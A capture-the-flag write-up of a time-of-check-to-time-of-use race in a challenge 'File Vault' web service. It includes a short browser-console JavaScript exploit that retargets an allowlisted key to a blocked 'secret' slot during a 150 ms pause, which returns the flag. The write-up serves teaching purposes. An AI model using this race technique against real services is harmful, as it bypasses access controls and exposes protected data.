# A Few Seconds Either Way

**Exploitation · Wave 4 · 133 pts**

A "File Vault" with two HTTP endpoints:

- `POST /read` — `{key}`, allowlist-enforced. Keys: `public`, `internal`
  (readable), `secret` (blocked).
- `POST /update` — `{key, value}` or `{key, link_to}`. The `link_to` form
  retargets a key to a different storage slot. **No allowlist.**

Read is documented as two steps with a **150 ms pause** between the allowlist
check and the actual fetch. Classic TOCTOU.

## The bug

`/read` checks the allowlist against the key *name* (`internal` passes), sleeps
150 ms, then resolves the key's *target* and reads. What you check and what you
use are not the same thing.

## Exploit

Run it from the browser console on the challenge origin so the session cookie
rides along (the server gates on `Cookie`):

```javascript
await post('/update', {key:'internal', link_to:'internal'}); // reset
const readP = post('/read', {key:'internal'});                // passes check, enters pause
await sleep(delay);                                           // ~10ms into the 150ms window
await post('/update', {key:'internal', link_to:'secret'});    // retarget during pause
console.log(await readP);                                     // resolves internal -> secret
```

Swept `delay` across the window; hit on the first offset (~10 ms). The delayed
read resolved `internal → secret` and returned the flag.

## Lesson

Check-the-name, use-the-target. A deliberate pause plus a second, less-guarded
mutation endpoint is all it takes to make the two disagree.
